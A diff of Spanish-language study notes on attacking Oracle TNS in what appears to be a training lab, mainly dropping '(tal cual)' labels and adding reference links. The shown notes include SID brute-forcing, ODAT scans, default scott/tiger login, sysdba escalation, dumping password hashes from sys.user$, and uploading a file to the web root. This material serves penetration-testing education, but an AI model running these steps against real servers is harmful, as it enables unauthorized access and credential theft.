@@ -337,7 +337,7 @@ Estos archivos suelen vivir en:
 
 Es el “diccionario” que usa el **cliente** para traducir un **nombre de servicio** a un **host/puerto** y parámetros de conexión.
 
-Ejemplo dado (tal cual):
+Ejemplo dado:
 
 ```txt
 ORCL =
@@ -463,7 +463,7 @@ Define cómo se comporta el **listener** (proceso del lado servidor):
 * qué SIDs/servicios expone,
 * parámetros, rutas, etc.
 
-Ejemplo dado (tal cual):
+Ejemplo dado:
 
 ```txt
 SID_LIST_LISTENER =
@@ -605,7 +605,7 @@ A continuación, los campos del contenido y qué significan **en la práctica**:
 
 Antes de enumerar/interactuar, el material sugiere instalar dependencias y ODAT.
 
-Comandos (tal cual):
+Comandos:
 
 ```bash
 apt update -y
@@ -664,7 +664,7 @@ Escaneo al puerto default:
 sudo nmap -p1521 -sV 10.129.204.235 --open
 ```
 
-Output (tal cual):
+Output:
 
 ```txt
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
@@ -735,7 +735,7 @@ Script NSE:
 sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
 ```
 
-Output (tal cual):
+Output:
 
 ```txt
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
@@ -781,7 +781,7 @@ Ejecutar todos los módulos (modo “all”):
 odat all -s 10.129.204.235
 ```
 
-Output relevante (tal cual, recortado):
+Output relevante:
 
 ```txt
 [+] Checking if target 10.129.204.235:1521 is well configured for a connection...
@@ -823,7 +823,7 @@ Conectás así:
 sqlplus scott/tiger@10.129.204.235/XE
 ```
 
-Output (tal cual):
+Output:
 
 ```txt
 SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
@@ -842,6 +842,7 @@ Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
 SQL>
 ```
 
+
 ### 13.1) Interpretación del mensaje ORA-28002
 
 No te bloquea el acceso: te avisa que **la contraseña expira pronto**.
@@ -859,7 +860,7 @@ Si aparece:
 
 `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`
 
-Solución sugerida (tal cual):
+Solución sugerida:
 
 ```bash
 sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
@@ -867,17 +868,22 @@ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-in
 
 **Qué hace esto:** agrega la ruta del Instant Client a `ld.so` para que el loader encuentre `libsqlplus.so`.
 
+El comando está sacado de [aquí](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).
+
+
 ---
 
 ## 14) Enumeración manual dentro de SQL*Plus
 
 ### 14.1) Listar tablas disponibles
 
+Existen muchos [comandos SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) que podemos usar para enumerar la base de datos manualmente. Por ejemplo, podemos listar todas las tablas disponibles en la base de datos actual o mostrar los privilegios del usuario actual, como se muestra a continuación:
+
 ```sql
 select table_name from all_tables;
 ```
 
-Output (tal cual, recortado):
+Output:
 
 ```txt
 TABLE_NAME
@@ -908,7 +914,7 @@ HELP
 select * from user_role_privs;
 ```
 
-Output (tal cual):
+Output:
 
 ```txt
 USERNAME                       GRANTED_ROLE                   ADM DEF OS_
@@ -932,7 +938,7 @@ El material muestra que se puede intentar:
 sqlplus scott/tiger@10.129.204.235/XE as sysdba
 ```
 
-Output (tal cual, recortado):
+Output:
 
 ```txt
 SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
@@ -989,7 +995,7 @@ Una acción clásica (para cracking offline) es consultar `sys.user$`:
 select name, password from sys.user$;
 ```
 
-Output (tal cual, recortado):
+Output:
 
 ```txt
 NAME                           PASSWORD
@@ -1041,13 +1047,13 @@ echo "Oracle File Upload Test" > testing.txt
 
 ### 17.2) Subirlo con ODAT (`utlfile`)
 
-Comando (tal cual):
+Comando:
 
 ```bash
 ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
 ```
 
-Output (tal cual):
+Output:
 
 ```txt
 [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
@@ -1060,7 +1066,7 @@ Output (tal cual):
 curl -X GET http://10.129.204.235/testing.txt
 ```
 
-Output (tal cual):
+Output:
 
 ```txt
 Oracle File Upload Test
